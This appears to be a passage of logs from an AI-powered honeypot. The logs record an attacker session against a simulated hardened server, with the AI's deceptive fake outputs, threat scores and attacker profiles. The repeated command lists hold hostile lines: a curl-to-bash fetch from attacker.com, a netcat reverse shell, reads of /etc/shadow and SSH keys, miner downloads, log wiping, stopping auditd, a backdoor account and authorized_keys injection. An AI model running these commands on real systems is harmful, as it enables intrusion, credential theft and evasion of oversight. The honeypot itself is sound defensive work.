root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:20:14,253 - {
    "session_id": "71dd20b2",
    "query": "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
    "response": "/home/ubuntu/.ssh/authorized_keys: Permission denied\n\n[2023-02-20 14:30:00] AUDIT LOG: \nUser: root (uid=1001) \nCommand: echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys \nResult: Permission denied \nLocation: /home/ubuntu/.ssh/authorized_keys",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 170,
        "risk_level": "CRITICAL",
        "final_score": 170,
        "threat_level": "CRITICAL",
        "base_score": 170,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 70,
            "unique_commands": 67,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 807,
            "commands_executed": 70,
            "successful_commands": 59,
            "failed_commands": 11,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 170,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx",
            "stop auditd",
            "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:20:14,254 - {"session_id": "71dd20b2", "command": "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys", "attack_type": "Persistence Attempt", "risk_score": 170, "threat_level": "CRITICAL"}
2026-07-21 11:20:14,254 - {
    "session_id": "71dd20b2",
    "command": "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
    "ai_decision": "/home/ubuntu/.ssh/authorized_keys: Permission denied\n\n[2023-02-20 14:30:00] AUDIT LOG: \nUser: root (uid=1001) \nCommand: echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys \nResult: Permission denied \nLocation: /home/ubuntu/.ssh/authorized_keys",
    "confidence_score": 0.9,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 70
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.9
    },
    "risk_score": 170,
    "threat_level": "CRITICAL"
}
2026-07-21 11:20:14,254 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
    "ai_decision": "/home/ubuntu/.ssh/authorized_keys: Permission denied\n\n[2023-02-20 14:30:00] AUDIT LOG: \nUser: root (uid=1001) \nCommand: echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys \nResult: Permission denied \nLocation: /home/ubuntu/.ssh/authorized_keys",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Persistence Attempt",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:20:28,759 - {
    "session_id": "71dd20b2",
    "query": "useradd -m -g root backdoor",
    "response": "audit_log.csv: \"2026-07-21 14:30:00,root,COMMAND_EXECUTED,useradd -m -g root backdoor,ERROR,User 'backdoor' already exists\"\n\n/var/log/audit.log: \"Jul 21 14:30:00 prod-restricted-01 useradd[12345]: useradd: user 'backdoor' already exists\"\n\n/var/log/syslog: \"Jul 21 14:30:00 prod-restricted-01 useradd[12345]: useradd: user 'backdoor' already exists\"",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 171,
        "risk_level": "CRITICAL",
        "final_score": 171,
        "threat_level": "CRITICAL",
        "base_score": 171,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 71,
            "unique_commands": 68,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 830,
            "commands_executed": 71,
            "successful_commands": 60,
            "failed_commands": 11,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 171,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx",
            "stop auditd",
            "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
            "useradd -m -g root backdoor"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:20:28,759 - {"session_id": "71dd20b2", "command": "useradd -m -g root backdoor", "attack_type": "Unknown", "risk_score": 171, "threat_level": "CRITICAL"}
2026-07-21 11:20:28,760 - {
    "session_id": "71dd20b2",
    "command": "useradd -m -g root backdoor",
    "ai_decision": "audit_log.csv: \"2026-07-21 14:30:00,root,COMMAND_EXECUTED,useradd -m -g root backdoor,ERROR,User 'backdoor' already exists\"\n\n/var/log/audit.log: \"Jul 21 14:30:00 prod-restricted-01 useradd[12345]: useradd: user 'backdoor' already exists\"\n\n/var/log/syslog: \"Jul 21 14:30:00 prod-restricted-01 useradd[12345]: useradd: user 'backdoor' already exists\"",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 71
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 171,
    "threat_level": "CRITICAL"
}
2026-07-21 11:20:28,760 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: useradd -m -g root backdoor",
    "ai_decision": "audit_log.csv: \"2026-07-21 14:30:00,root,COMMAND_EXECUTED,useradd -m -g root backdoor,ERROR,User 'backdoor' already exists\"\n\n/var/log/audit.log: \"Jul 21 14:30:00 prod-restricted-01 useradd[12345]: useradd: user 'backdoor' already exists\"\n\n/var/log/syslog: \"Jul 21 14:30:00 prod-restricted-01 useradd[12345]: useradd: user 'backdoor' already exists\"",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:20:28,847 - {
    "session_id": "71dd20b2",
    "query": "crontab -e",
    "response": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 183,
        "risk_level": "CRITICAL",
        "final_score": 183,
        "threat_level": "CRITICAL",
        "base_score": 183,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 72,
            "unique_commands": 69,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 845,
            "commands_executed": 72,
            "successful_commands": 61,
            "failed_commands": 11,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 183,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx",
            "stop auditd",
            "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
            "useradd -m -g root backdoor",
            "crontab -e"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:20:28,848 - {"session_id": "71dd20b2", "command": "crontab -e", "attack_type": "Persistence Attempt", "risk_score": 183, "threat_level": "CRITICAL"}
2026-07-21 11:20:28,848 - {
    "session_id": "71dd20b2",
    "command": "crontab -e",
    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
    "confidence_score": 0.9,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 72
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.9
    },
    "risk_score": 183,
    "threat_level": "CRITICAL"
}
2026-07-21 11:20:28,848 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: crontab -e",
    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Persistence Attempt",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:20:44,071 - {
    "session_id": "71dd20b2",
    "query": "sqlmap -u \"http://site.com/index.php?id=1\" --dbs",
    "response": "[2023-12-01 14:30:00] [AUDIT LOG] [COMMAND EXECUTED] [USER=root] [COMMAND=sqlmap -u \"http://site.com/index.php?id=1\" --dbs]\n\n[2023-12-01 14:30:00] [AUDIT LOG] [COMMAND OUTPUT]\n\n[!] legal disclaimer: sqlmap is a security tool used for detecting and exploiting SQL injection vulnerabilities. unauthorized use is prohibited.\n\n[!] sqlmap is not installed on this system. Please install it using apt-get or pip.\n\n[!] sqlmap command failed. exiting...\n\n[2023-12-01 14:30:00] [AUDIT LOG] [COMMAND EXECUTION COMPLETE] [USER=root] [COMMAND=sqlmap -u \"http://site.com/index.php?id=1\" --dbs] [RETURN CODE=1]",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 184,
        "risk_level": "CRITICAL",
        "final_score": 184,
        "threat_level": "CRITICAL",
        "base_score": 184,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 73,
            "unique_commands": 70,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 845,
            "commands_executed": 73,
            "successful_commands": 62,
            "failed_commands": 11,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 184,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx",
            "stop auditd",
            "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
            "useradd -m -g root backdoor",
            "crontab -e",
            "sqlmap -u \"http://site.com/index.php?id=1\" --dbs"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:20:44,071 - {"session_id": "71dd20b2", "command": "sqlmap -u \"http://site.com/index.php?id=1\" --dbs", "attack_type": "Unknown", "risk_score": 184, "threat_level": "CRITICAL"}
2026-07-21 11:20:44,071 - {
    "session_id": "71dd20b2",
    "command": "sqlmap -u \"http://site.com/index.php?id=1\" --dbs",
    "ai_decision": "[2023-12-01 14:30:00] [AUDIT LOG] [COMMAND EXECUTED] [USER=root] [COMMAND=sqlmap -u \"http://site.com/index.php?id=1\" --dbs]\n\n[2023-12-01 14:30:00] [AUDIT LOG] [COMMAND OUTPUT]\n\n[!] legal disclaimer: sqlmap is a security tool used for detecting and exploiting SQL injection vulnerabilities. unauthorized use is prohibited.\n\n[!] sqlmap is not installed on this system. Please install it using apt-get or pip.\n\n[!] sqlmap command failed. exiting...\n\n[2023-12-01 14:30:00] [AUDIT LOG] [COMMAND EXECUTION COMPLETE] [USER=root] [COMMAND=sqlmap -u \"http://site.com/index.php?id=1\" --dbs] [RETURN CODE=1]",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 73
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 184,
    "threat_level": "CRITICAL"
}
2026-07-21 11:20:44,071 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: sqlmap -u \"http://site.com/index.php?id=1\" --dbs",
    "ai_decision": "[2023-12-01 14:30:00] [AUDIT LOG] [COMMAND EXECUTED] [USER=root] [COMMAND=sqlmap -u \"http://site.com/index.php?id=1\" --dbs]\n\n[2023-12-01 14:30:00] [AUDIT LOG] [COMMAND OUTPUT]\n\n[!] legal disclaimer: sqlmap is a security tool used for detecting and exploiting SQL injection vulnerabilities. unauthorized use is prohibited.\n\n[!] sqlmap is not installed on this system. Please install it using apt-get or pip.\n\n[!] sqlmap command failed. exiting...\n\n[2023-12-01 14:30:00] [AUDIT LOG] [COMMAND EXECUTION COMPLETE] [USER=root] [COMMAND=sqlmap -u \"http://site.com/index.php?id=1\" --dbs] [RETURN CODE=1]",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:20:59,350 - {
    "session_id": "71dd20b2",
    "query": "date",
    "response": "Fri Jul 21 00:00:00 UTC 2023",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 185,
        "risk_level": "CRITICAL",
        "final_score": 185,
        "threat_level": "CRITICAL",
        "base_score": 185,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 74,
            "unique_commands": 71,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 860,
            "commands_executed": 74,
            "successful_commands": 63,
            "failed_commands": 11,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 185,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx",
            "stop auditd",
            "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
            "useradd -m -g root backdoor",
            "crontab -e",
            "sqlmap -u \"http://site.com/index.php?id=1\" --dbs",
            "date"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:20:59,351 - {"session_id": "71dd20b2", "command": "date", "attack_type": "Unknown", "risk_score": 185, "threat_level": "CRITICAL"}
2026-07-21 11:20:59,351 - {
    "session_id": "71dd20b2",
    "command": "date",
    "ai_decision": "Fri Jul 21 00:00:00 UTC 2023",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 74
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 185,
    "threat_level": "CRITICAL"
}
2026-07-21 11:20:59,351 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: date",
    "ai_decision": "Fri Jul 21 00:00:00 UTC 2023",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:20:59,435 - {
    "session_id": "71dd20b2",
    "query": "env",
    "response": "SHELL=/bin/bash\nUSER=ubuntu\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nPWD=/home/ubuntu\nLANG=en_US.UTF-8\nHOME=/home/ubuntu\nLOGNAME=ubuntu",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 186,
        "risk_level": "CRITICAL",
        "final_score": 186,
        "threat_level": "CRITICAL",
        "base_score": 186,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 75,
            "unique_commands": 72,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 875,
            "commands_executed": 75,
            "successful_commands": 64,
            "failed_commands": 11,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 186,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
